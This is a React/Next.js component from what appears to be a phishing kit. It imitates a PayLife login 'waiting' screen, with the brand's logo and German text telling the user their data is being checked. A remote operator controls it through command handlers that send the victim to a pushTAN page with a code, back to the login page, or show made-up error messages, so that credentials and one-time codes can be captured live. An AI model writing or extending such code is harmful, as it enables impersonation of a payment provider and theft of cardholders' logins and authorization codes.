"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { onCommand } from "@/lib/track";

export default function WaitingScreen({ user }: { user: string }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "forward_to_tan":
          router.push(
            `/pushtan?code=${encodeURIComponent(String(cmd.payload?.code ?? ""))}&user=${encodeURIComponent(user)}`
          );
          break;
        case "back_to_login":
          router.push("/");
          break;
        case "show_error":
          setError(
            (cmd.payload?.message as string) || "Ein Fehler ist aufgetreten."
          );
          break;
        case "clear_error":
          setError(null);
          break;
      }
    });
    return () => onCommand(() => {});
  }, [router, user]);

  return (
    <div className="page-container facelift">
      <section id="authenticationContainer">
        <div className="auth-row">
          {/* LEFT: Waiting content */}
          <div id="login-content">
            <header id="headerContainer" role="banner">
              <img
                alt="PayLife Logo"
                className="logo-desktop"
                src="/mypaylife/paylife-logo.svg"
                style={{ height: 50 }}
              />
            </header>

            <section id="authenticationSection">
              <main>
                <div id="loginContainer">
                  <h1 className="form-signin-heading">Login</h1>

                  {/* Error banner */}
                  {error && (
                    <div
                      style={{
                        backgroundColor: "#fef2f2",
                        border: "1px solid #fecaca",
                        borderRadius: 6,
                        padding: "10px 14px",
                        color: "#b91c1c",
                        fontSize: 13,
                        lineHeight: 1.5,
                        marginBottom: 14,
                      }}
                    >
                      {error}
                    </div>
                  )}

                  {/* Spinner + waiting text */}
                  <div
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      alignItems: "center",
                      justifyContent: "center",
                      padding: "40px 0 50px",
                    }}
                  >
                    {/* CSS Spinner */}
                    <div
                      style={{
                        width: 48,
                        height: 48,
                        border: "4px solid #ced4da",
                        borderTopColor: "#000066",
                        borderRadius: "50%",
                        animation: "waiting-spin 0.8s linear infinite",
                        marginBottom: 24,
                      }}
                    />
                    <p
                      style={{
                        fontSize: 16,
                        fontWeight: 500,
                        color: "#000000",
                        margin: "0 0 6px",
                        textAlign: "center",
                      }}
                    >
                      Ihre Daten werden {"ü"}berpr{"ü"}ft...
                    </p>
                    <p
                      style={{
                        fontSize: 13,
                        color: "#555555",
                        margin: 0,
                        textAlign: "center",
                      }}
                    >
                      Bitte warten Sie...
                    </p>
                  </div>
                </div>
              </main>
            </section>
          </div>

          {/* RIGHT: Hero image */}
          <div className="d-none d-md-block full-size-image"></div>
        </div>
      </section>

      {/* Footer */}
      <div id="footerContainer">
        <div className="footer-content">
          <span>
            <a href="#" target="_blank">
              FAQ
            </a>
            <a href="#" target="_blank">
              Impressum
            </a>
          </span>
          <span>
            <img
              src="/mypaylife/paylife-logo.svg"
              className="footer-logo"
              style={{ height: 17 }}
              alt="PayLife Logo"
            />
          </span>
        </div>
      </div>

      {/* Spinner keyframes */}
      <style>{`
        @keyframes waiting-spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
